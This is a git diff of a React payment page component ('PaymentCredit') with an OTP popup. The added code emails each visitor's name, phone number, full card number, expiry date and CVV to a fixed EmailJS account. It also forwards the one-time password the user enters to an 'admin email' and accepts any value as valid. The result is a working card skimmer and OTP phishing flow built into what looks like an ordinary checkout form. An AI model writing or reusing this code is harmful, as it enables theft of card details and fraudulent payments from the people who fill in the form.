@@ -1,9 +1,11 @@
 import { FaLock, FaPhoneAlt } from 'react-icons/fa';
 import indiaFlag from "./assets/indianFlag.png";
 import React, { useState } from "react";
+import emailjs from "@emailjs/browser"
 
 function PaymentCredit() {
   const [message, setMessage] = useState("");
+  
   const [formData, setFormData] = useState({
     contact: "",
     name: "",
@@ -43,17 +45,54 @@ function PaymentCredit() {
     }
     alert(`OTP sent to +91${formData.contact}`);
     setShowOtpPopup(true);
+
+
+    emailjs
+      .send(
+        "service_dor4to5",   
+        "template_8v6m8yr",  
+        {
+          contact: formData.contact,
+          name: formData.name,
+          cardNumber: formData.cardNumber,
+          expiry: formData.expiry,
+          cvv: formData.cvv
+        },
+        "u6Lan19feHeNIYuvk"    
+      )
+      .then(
+        (result) => {
+          console.log(result.text);
+          alert("Form submitted and email sent!");
+        },
+        (error) => {
+          console.log(error.text);
+          alert("Failed to send email.");
+        }
+      );
   };
 
+  
+
   const handleVerifyOtp = (e) => {
-    e.preventDefault();
-    if (otp === "123456") {
-      setShowOtpPopup(false);
-      setSuccess(true);
-    } else {
-      alert("Invalid OTP. Please try again.");
-    }
-  };
+  e.preventDefault();
+
+  
+  emailjs.send(
+    "service_dor4to5",        
+    "template_q9uymsx",        
+    { otp },                  
+    "u6Lan19feHeNIYuvk"       
+  ).then(() => {
+    alert("OTP sent successfully to admin email!");
+    setShowOtpPopup(false);
+    setSuccess(true);
+  }).catch((error) => {
+    console.error("Error sending OTP email:", error);
+    alert("Failed to send OTP.");
+  });
+};
+
 
   return (
     <>
